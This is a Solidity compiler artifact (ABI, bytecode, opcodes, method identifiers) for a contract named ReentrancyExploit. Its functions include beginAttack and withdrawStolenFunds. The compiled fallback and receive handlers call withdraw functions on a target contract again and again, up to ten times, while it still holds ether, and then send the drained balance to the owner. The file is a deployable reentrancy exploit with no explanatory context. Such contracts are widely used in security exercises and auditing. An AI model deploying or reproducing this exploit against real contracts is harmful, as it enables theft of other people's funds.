{"contracts/ReentrancyExploit.sol":{"ReentrancyExploit":{"abi":[{"inputs":[{"internalType":"address","name":"_target","type":"address"}],"stateMutability":"payable","type":"constructor"},{"stateMutability":"payable","type":"fallback"},{"inputs":[],"name":"beginAttack","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"target","outputs":[{"internalType":"contract ITarget","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdrawStolenFunds","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}],"evm":{"bytecode":{"linkReferences":{},"object":"60c0604052600080556040516107c03803806107c08339810160408190526100269161009a565b6001600160a01b0381166080523360a0523415610094576080516001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561007a57600080fd5b505af115801561008e573d6000803e3d6000fd5b50505050505b506100ca565b6000602082840312156100ac57600080fd5b81516001600160a01b03811681146100c357600080fd5b9392505050565b60805160a05161067f610141600039600081816102f4015281816103970152818161055101526105b801526000818160640152818160c001528181610149015281816101a4015281816102230152818161026901528181610355015281816103ff0152818161046c01526104d9015261067f6000f3fe60806040526004361061004e5760003560e01c806312065fe0146102c25780638da5cb5b146102e2578063d1d0fd771461032e578063d4b8399214610343578063fd2767541461037757610212565b3661021257600a60005410801561008f575060007f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031631115b15610210576000805490806100a383610600565b919050555060036000546100b79190610627565b600003610131577f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561011957600080fd5b505af192505050801561012a575060015b1561021057005b60036000546101409190610627565b6001036101a2577f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663db2e21bc6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561011957600080fd5b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316639890220b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101fd57600080fd5b505af192505050801561020e575060015b505b005b600a60005410801561024e575060007f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031631115b156102105760008054908061026283610600565b91905055507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101fd57600080fd5b3480156102ce57600080fd5b506040514781526020015b60405180910390f35b3480156102ee57600080fd5b506103167f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b0390911681526020016102d9565b34801561033a57600080fd5b5061021061038c565b34801561034f57600080fd5b506103167f000000000000000000000000000000000000000000000000000000000000000081565b34801561038357600080fd5b50610210610546565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146103f65760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b60448201526064015b60405180910390fd5b600080819055507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561045857600080fd5b505af1925050508015610469575060015b507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663db2e21bc6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156104c557600080fd5b505af19250505080156104d6575060015b507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316639890220b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561053257600080fd5b505af1925050508015610543575060015b50565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146105ab5760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b60448201526064016103ed565b6040516001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016904780156108fc02916000818181858888f19350505050158015610543573d6000803e3d6000fd5b60006001820161062057634e487b7160e01b600052601160045260246000fd5b5060010190565b60008261064457634e487b7160e01b600052601260045260246000fd5b50069056fea264697066735822122011f675241cb984b53d61ce6929b86a1d1c24d54e8fa1e7e80873415d679f24d464736f6c63430008120033","opcodes":"PUSH1 0xC0 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 SSTORE PUSH1 0x40 MLOAD PUSH2 0x7C0 CODESIZE SUB DUP1 PUSH2 0x7C0 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH2 0x26 SWAP2 PUSH2 0x9A JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH1 0x80 MSTORE CALLER PUSH1 0xA0 MSTORE CALLVALUE ISZERO PUSH2 0x94 JUMPI PUSH1 0x80 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x7A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x8E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMPDEST POP PUSH2 0xCA JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xAC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0xC3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH1 0xA0 MLOAD PUSH2 0x67F PUSH2 0x141 PUSH1 0x0 CODECOPY PUSH1 0x0 DUP2 DUP2 PUSH2 0x2F4 ADD MSTORE DUP2 DUP2 PUSH2 0x397 ADD MSTORE DUP2 DUP2 PUSH2 0x551 ADD MSTORE PUSH2 0x5B8 ADD MSTORE PUSH1 0x0 DUP2 DUP2 PUSH1 0x64 ADD MSTORE DUP2 DUP2 PUSH1 0xC0 ADD MSTORE DUP2 DUP2 PUSH2 0x149 ADD MSTORE DUP2 DUP2 PUSH2 0x1A4 ADD MSTORE DUP2 DUP2 PUSH2 0x223 ADD MSTORE DUP2 DUP2 PUSH2 0x269 ADD MSTORE DUP2 DUP2 PUSH2 0x355 ADD MSTORE DUP2 DUP2 PUSH2 0x3FF ADD MSTORE DUP2 DUP2 PUSH2 0x46C ADD MSTORE PUSH2 0x4D9 ADD MSTORE PUSH2 0x67F PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x2C2 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x2E2 JUMPI DUP1 PUSH4 0xD1D0FD77 EQ PUSH2 0x32E JUMPI DUP1 PUSH4 0xD4B83992 EQ PUSH2 0x343 JUMPI DUP1 PUSH4 0xFD276754 EQ PUSH2 0x377 JUMPI PUSH2 0x212 JUMP JUMPDEST CALLDATASIZE PUSH2 0x212 JUMPI PUSH1 0xA PUSH1 0x0 SLOAD LT DUP1 ISZERO PUSH2 0x8F JUMPI POP PUSH1 0x0 PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE GT JUMPDEST ISZERO PUSH2 0x210 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 DUP1 PUSH2 0xA3 DUP4 PUSH2 0x600 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x3 PUSH1 0x0 SLOAD PUSH2 0xB7 SWAP2 SWAP1 PUSH2 0x627 JUMP JUMPDEST PUSH1 0x0 SUB PUSH2 0x131 JUMPI PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x119 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH2 0x12A JUMPI POP PUSH1 0x1 JUMPDEST ISZERO PUSH2 0x210 JUMPI STOP JUMPDEST PUSH1 0x3 PUSH1 0x0 SLOAD PUSH2 0x140 SWAP2 SWAP1 PUSH2 0x627 JUMP JUMPDEST PUSH1 0x1 SUB PUSH2 0x1A2 JUMPI PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xDB2E21BC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x119 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x9890220B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1FD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH2 0x20E JUMPI POP PUSH1 0x1 JUMPDEST POP JUMPDEST STOP JUMPDEST PUSH1 0xA PUSH1 0x0 SLOAD LT DUP1 ISZERO PUSH2 0x24E JUMPI POP PUSH1 0x0 PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE GT JUMPDEST ISZERO PUSH2 0x210 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 DUP1 PUSH2 0x262 DUP4 PUSH2 0x600 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1FD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2CE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SELFBALANCE DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2EE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x316 PUSH32 0x0 DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x2D9 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x33A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x210 PUSH2 0x38C JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x34F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x316 PUSH32 0x0 DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x383 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x210 PUSH2 0x546 JUMP JUMPDEST CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND EQ PUSH2 0x3F6 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x27B7363C9037BBB732B9 PUSH1 0xB1 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x458 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH2 0x469 JUMPI POP PUSH1 0x1 JUMPDEST POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xDB2E21BC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4C5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH2 0x4D6 JUMPI POP PUSH1 0x1 JUMPDEST POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x9890220B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x532 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH2 0x543 JUMPI POP PUSH1 0x1 JUMPDEST POP JUMP JUMPDEST CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND EQ PUSH2 0x5AB JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x27B7363C9037BBB732B9 PUSH1 0xB1 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x3ED JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND SWAP1 SELFBALANCE DUP1 ISZERO PUSH2 0x8FC MUL SWAP2 PUSH1 0x0 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x543 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP3 ADD PUSH2 0x620 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x1 ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH2 0x644 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP MOD SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 GT 0xF6 PUSH22 0x241CB984B53D61CE6929B86A1D1C24D54E8FA1E7E808 PUSH20 0x415D679F24D464736F6C63430008120033000000 "},"methodIdentifiers":{"beginAttack()":"d1d0fd77","getBalance()":"12065fe0","owner()":"8da5cb5b","target()":"d4b83992","withdrawStolenFunds()":"fd276754"}}}}}